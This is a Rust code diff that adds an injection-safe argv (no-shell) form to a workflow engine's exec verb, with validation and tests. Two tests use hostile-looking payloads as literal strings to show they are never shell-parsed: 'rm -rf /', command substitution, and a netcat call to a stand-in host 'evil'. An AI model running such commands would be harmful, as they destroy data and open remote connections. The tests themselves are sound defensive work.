@@ -9,6 +9,10 @@
 //!
 //! ## Shape
 //!
+//! - **Two command forms, different security** — [`ExecCommand::Argv`]
+//!   (`execve`, no shell · injection-safe · the default for any interpolated
+//!   value) vs [`ExecCommand::Shell`] (`/bin/sh -c` · pipes · redirects ·
+//!   blocklist-gated · genuine pipelines only). See [`ExecCommand`].
 //! - **Effect injected, never owned** — the verb rides the kernel
 //!   `ShellRunDyn` seam: production wiring hands it
 //!   `nika-exec-runner::TokioShell` (s7 · blocklist + hard-kill timeout +
@@ -36,7 +40,8 @@
 //!
 //! # async fn demo() -> Result<(), Box<dyn std::error::Error>> {
 //! let verb = ExecVerb::new(Arc::new(MockShell::new().enqueue_ok("hello\n")));
-//! let out = verb.run(ExecInput::new("echo hello")).await?;
+//! // argv form — injection-safe (no shell): each element is one literal token.
+//! let out = verb.run(ExecInput::argv(["echo", "hello"])).await?;
 //! # Ok(())
 //! # }
 //! ```
@@ -54,12 +59,40 @@ use nika_kernel::process::{ShellCommand, ShellResult, ShellRunDyn};
 
 pub use errors::VerbExecError;
 
+/// The command to run — one of the two spec `command` forms (§exec).
+///
+/// The two forms have **different security properties**, and choosing the
+/// right one is the single most important `exec` decision:
+/// - [`Shell`](ExecCommand::Shell) runs the string through `/bin/sh -c` —
+///   pipes, redirects, and globbing work, but the shell PARSES the whole
+///   line, so any interpolated value is shell-parsed too (the injection
+///   surface · the runner blocklist is a best-effort tripwire here).
+/// - [`Argv`](ExecCommand::Argv) runs `command[0]` via `execve` with **no
+///   shell**: every element is passed as ONE argv token verbatim. An
+///   interpolated value can never break out of its argument — there is no
+///   shell to parse it. **This is the structural fix for command injection**
+///   (spec §exec) · the one-obvious-way for any value not authored inline.
+#[derive(Debug, Clone, PartialEq, Eq)]
+#[non_exhaustive]
+pub enum ExecCommand {
+    /// String form → `/bin/sh -c <line>` (pipes · redirects · the shell
+    /// blocklist applies). Use ONLY for genuine shell pipelines with no
+    /// interpolated or untrusted value.
+    Shell(String),
+    /// Array form → `execve(command[0], command)` with NO shell. Each
+    /// element is one argv token verbatim — injection-safe. The default
+    /// choice for any command carrying a task output, a var, or any value
+    /// not authored inline.
+    Argv(Vec<String>),
+}
+
 /// The `exec` task input — spec fields, already CEL-resolved.
 #[derive(Debug, Clone)]
 #[non_exhaustive]
 pub struct ExecInput {
-    /// The command to run (required · spec §exec · CEL-resolved upstream).
-    pub command: String,
+    /// The command to run (required · spec §exec · CEL-resolved upstream) ·
+    /// a shell string XOR an argv vector ([`ExecCommand`]).
+    pub command: ExecCommand,
     /// Working directory (default: engine cwd).
     pub cwd: Option<PathBuf>,
     /// OS environment for THIS subprocess (NOT the envelope `env:`).
@@ -74,11 +107,42 @@ pub struct ExecInput {
 }
 
 impl ExecInput {
-    /// A default-capture run with every optional field unset.
+    /// A shell-form run (`/bin/sh -c`) with every optional field unset.
+    ///
+    /// Convenience alias for [`ExecInput::shell`], kept for the common
+    /// genuine-pipeline case. **Prefer [`ExecInput::argv`]** for any command
+    /// carrying an interpolated or untrusted value (injection-safe).
     #[must_use]
     pub fn new(command: impl Into<String>) -> Self {
+        Self::shell(command)
+    }
+
+    /// A shell-form run: the string goes through `/bin/sh -c` (pipes ·
+    /// redirects · blocklist-gated). Use only for genuine shell pipelines.
+    #[must_use]
+    pub fn shell(command: impl Into<String>) -> Self {
+        Self::with_command(ExecCommand::Shell(command.into()))
+    }
+
+    /// An argv-form run: `execve` with **no shell** · each element is one
+    /// literal argv token. The injection-safe form — the one-obvious-way for
+    /// any value not authored inline (spec §exec).
+    #[must_use]
+    pub fn argv<I, S>(argv: I) -> Self
+    where
+        I: IntoIterator<Item = S>,
+        S: Into<String>,
+    {
+        Self::with_command(ExecCommand::Argv(
+            argv.into_iter().map(Into::into).collect(),
+        ))
+    }
+
+    /// Construct from an explicit [`ExecCommand`] with optional fields unset.
+    #[must_use]
+    fn with_command(command: ExecCommand) -> Self {
         Self {
-            command: command.into(),
+            command,
             cwd: None,
             env: BTreeMap::new(),
             stdin: None,
@@ -163,8 +227,8 @@ where
     ///
     /// # Errors
     ///
-    /// [`VerbExecError::InvalidParam`] on an empty command, a NUL byte in
-    /// the command/stdin, or a malformed env key ·
+    /// [`VerbExecError::InvalidParam`] on a blank command, an empty argv, a
+    /// NUL byte in any command element / stdin, or a malformed env key ·
     /// [`VerbExecError::Shell`] when the runner fails (spawn · blocklist ·
     /// timeout) · [`VerbExecError::NonZeroExit`] on a non-zero exit in the
     /// default capture modes (`structured` returns it as data instead).
@@ -191,26 +255,53 @@ where
 
 /// Verb-boundary validation BEFORE the runner call (NIKA-442).
 ///
-/// The runner's blocklist (s7) is the security floor, but two corruption
+/// The runner's blocklist (s7) is the security floor, but corruption
 /// classes must be refused at the verb boundary because they would
 /// silently change what the OS executes (review lens 3 · P1+P2):
-/// - a **NUL byte** in `command`/`stdin` truncates the C-string the shell
-///   receives, so the runner's string-based blocklist checks a different
-///   command than the one that runs;
+/// - a **NUL byte** in any command element / `stdin` truncates the C-string
+///   the OS receives, so a downstream check would see a different command
+///   than the one that runs;
+/// - an **empty argv** (or a blank `argv[0]`) has no program to execute;
 /// - a **malformed env key** (`=`, NUL, or empty) corrupts the child's
 ///   `KEY=VALUE` environment assembly.
 fn validate_params(input: &ExecInput) -> Result<(), VerbExecError> {
-    if input.command.trim().is_empty() {
-        return Err(VerbExecError::InvalidParam {
-            param: "command",
-            detail: "command must be a non-empty string".to_owned(),
-        });
-    }
-    if input.command.contains('\0') {
-        return Err(VerbExecError::InvalidParam {
-            param: "command",
-            detail: "command must not contain a NUL byte".to_owned(),
-        });
+    match &input.command {
+        ExecCommand::Shell(line) => {
+            if line.trim().is_empty() {
+                return Err(VerbExecError::InvalidParam {
+                    param: "command",
+                    detail: "command must be a non-empty string".to_owned(),
+                });
+            }
+            if line.contains('\0') {
+                return Err(VerbExecError::InvalidParam {
+                    param: "command",
+                    detail: "command must not contain a NUL byte".to_owned(),
+                });
+            }
+        }
+        ExecCommand::Argv(argv) => {
+            let Some(program) = argv.first() else {
+                return Err(VerbExecError::InvalidParam {
+                    param: "command",
+                    detail: "argv command must have at least one element (the program)".to_owned(),
+                });
+            };
+            if program.trim().is_empty() {
+                return Err(VerbExecError::InvalidParam {
+                    param: "command",
+                    detail: "argv[0] (the program) must be a non-empty string".to_owned(),
+                });
+            }
+            for (index, element) in argv.iter().enumerate() {
+                if element.contains('\0') {
+                    return Err(VerbExecError::InvalidParam {
+                        param: "command",
+                        detail: format!("argv element {index} must not contain a NUL byte"),
+                    });
+                }
+            }
+        }
     }
     if input.stdin.as_deref().is_some_and(|s| s.contains('\0')) {
         return Err(VerbExecError::InvalidParam {
@@ -231,13 +322,32 @@ fn validate_params(input: &ExecInput) -> Result<(), VerbExecError> {
 
 /// Map the spec task surface onto the kernel `ShellCommand`.
 ///
-/// `shell = true` (spec: « run via the OS shell ») · `pre_validated` stays
-/// `false` FOREVER — this crate never bypasses the runner blocklist.
-/// Takes `input` by value so the (potentially large) env map and strings
-/// move into the command instead of cloning (review lens 1 · P2-3).
+/// [`ExecCommand::Shell`] sets `shell = true` (spec: « run via the OS
+/// shell »); [`ExecCommand::Argv`] sets `shell = false` — `command[0]` is
+/// the program, the rest are argv passed verbatim through `execve` (no
+/// shell parse · the structural injection fix). `pre_validated` stays
+/// `false` FOREVER — this crate never bypasses the runner blocklist. Takes
+/// `input` by value so the (potentially large) env map and strings move
+/// into the command instead of cloning (review lens 1 · P2-3).
 fn build_command(input: ExecInput) -> ShellCommand {
-    let mut cmd = ShellCommand::new(input.command);
-    cmd.shell = true;
+    let mut cmd = match input.command {
+        ExecCommand::Shell(line) => {
+            let mut c = ShellCommand::new(line);
+            c.shell = true;
+            c
+        }
+        ExecCommand::Argv(argv) => {
+            // command[0] = program, the rest = args · NO shell. `next` is
+            // panic-free; an empty argv is already refused upstream by
+            // `validate_params`, so the default `""` is never reached.
+            let mut it = argv.into_iter();
+            let program = it.next().unwrap_or_default();
+            let mut c = ShellCommand::new(program);
+            c.args = it.collect();
+            c.shell = false;
+            c
+        }
+    };
     cmd.cwd = input.cwd;
     cmd.env = input.env;
     cmd.stdin = input.stdin;
@@ -474,6 +584,118 @@ mod tests {
             VerbExecError::InvalidParam { param: "stdin", .. }
         ));
     }
+
+    // ── Step 1: the array (argv) form — THE structural injection fix ──
+
+    /// THE headline property: an argv element carrying shell metacharacters
+    /// (`;`, `$(...)`, backticks, `|`) reaches the runner as ONE literal
+    /// argv token with the shell flag OFF — there is no shell to parse it,
+    /// so it can never break out of its argument into a second command.
+    #[tokio::test]
+    async fn argv_form_runs_without_shell_and_each_arg_is_literal() {
+        let mock = MockShell::new().enqueue_ok("");
+        let recorder = mock.clone();
+        let payload = "; rm -rf / # $(whoami) `id` | nc evil 4444";
+        verb(mock)
+            .run(ExecInput::argv(["printf", "%s", payload]))
+            .await
+            .expect("argv form runs");
+        let sent = recorder.executed_commands();
+        assert_eq!(sent.len(), 1);
+        assert!(
+            !sent[0].shell,
+            "argv form MUST NOT use the shell (no sh -c)"
+        );
+        assert!(!sent[0].pre_validated, "blocklist floor stays armed");
+        assert_eq!(sent[0].program, "printf");
+        assert_eq!(
+            sent[0].args,
+            vec!["%s".to_owned(), payload.to_owned()],
+            "the metachar payload is ONE literal argv element — never split or parsed"
+        );
+    }
+
+    /// The shell form keeps `/bin/sh -c` for genuine pipelines (the whole
+    /// line is the program, the shell flag is ON).
+    #[tokio::test]
+    async fn shell_form_still_uses_the_shell() {
+        let mock = MockShell::new().enqueue_ok("");
+        let recorder = mock.clone();
+        verb(mock)
+            .run(ExecInput::shell("echo a | grep b"))
+            .await
+            .expect("shell form runs");
+        let sent = recorder.executed_commands();
+        assert!(sent[0].shell, "shell form keeps sh -c for pipelines");
+        assert_eq!(sent[0].program, "echo a | grep b");
+        assert!(sent[0].args.is_empty());
+    }
+
+    /// `new` is the shell form (back-compat convenience alias).
+    #[tokio::test]
+    async fn new_is_the_shell_form() {
+        let mock = MockShell::new().enqueue_ok("");
+        let recorder = mock.clone();
+        verb(mock)
+            .run(ExecInput::new("cargo build"))
+            .await
+            .expect("runs");
+        assert!(recorder.executed_commands()[0].shell);
+    }
+
+    #[tokio::test]
+    async fn empty_argv_is_rejected_before_any_call() {
+        let mock = MockShell::new();
+        let recorder = mock.clone();
+        let err = verb(mock)
+            .run(ExecInput::argv(Vec::<String>::new()))
+            .await
+            .expect_err("empty argv refused");
+        assert!(matches!(
+            err,
+            VerbExecError::InvalidParam {
+                param: "command",
+                ..
+            }
+        ));
+        assert!(recorder.executed_commands().is_empty(), "zero runner calls");
+    }
+
+    #[tokio::test]
+    async fn blank_argv0_program_is_rejected() {
+        let mock = MockShell::new();
+        let recorder = mock.clone();
+        let err = verb(mock)
+            .run(ExecInput::argv(["   ", "arg"]))
+            .await
+            .expect_err("blank program refused");
+        assert!(matches!(
+            err,
+            VerbExecError::InvalidParam {
+                param: "command",
+                ..
+            }
+        ));
+        assert!(recorder.executed_commands().is_empty());
+    }
+
+    #[tokio::test]
+    async fn nul_byte_in_argv_element_is_rejected() {
+        let mock = MockShell::new();
+        let recorder = mock.clone();
+        let err = verb(mock)
+            .run(ExecInput::argv(["echo", "ok\0; rm -rf /"]))
+            .await
+            .expect_err("NUL in an argv element refused");
+        assert!(matches!(
+            err,
+            VerbExecError::InvalidParam {
+                param: "command",
+                ..
+            }
+        ));
+        assert!(recorder.executed_commands().is_empty(), "zero runner calls");
+    }
 }
 
 #[cfg(test)]
@@ -553,6 +775,32 @@ mod proptests {
                 ExecValue::Text(t) if t == expected
             );
             prop_assert!(combined_ok);
+        }
+
+        /// Argv injection-safety, over ALL inputs: for any program + args
+        /// (NUL-free), every element reaches the runner as a LITERAL argv
+        /// token (program + args verbatim) with the shell flag OFF — nothing
+        /// is split, merged, or shell-parsed. The structural proof that the
+        /// array form closes the injection surface for arbitrary payloads.
+        #[test]
+        fn argv_elements_reach_runner_verbatim_no_shell(
+            program in "[a-zA-Z0-9_./-]{1,10}",
+            args in proptest::collection::vec("[^\\x00]{0,16}", 0..5),
+        ) {
+            let rt = tokio::runtime::Builder::new_current_thread().build().unwrap();
+            rt.block_on(async {
+                let mock = MockShell::new().enqueue_ok("");
+                let recorder = mock.clone();
+                let mut argv = vec![program.clone()];
+                argv.extend(args.clone());
+                verb(mock).run(ExecInput::argv(argv)).await.expect("argv runs");
+                let sent = recorder.executed_commands();
+                prop_assert_eq!(sent.len(), 1);
+                prop_assert!(!sent[0].shell, "argv form never uses the shell");
+                prop_assert_eq!(&sent[0].program, &program);
+                prop_assert_eq!(&sent[0].args, &args);
+                Ok(())
+            })?;
         }
     }
 }
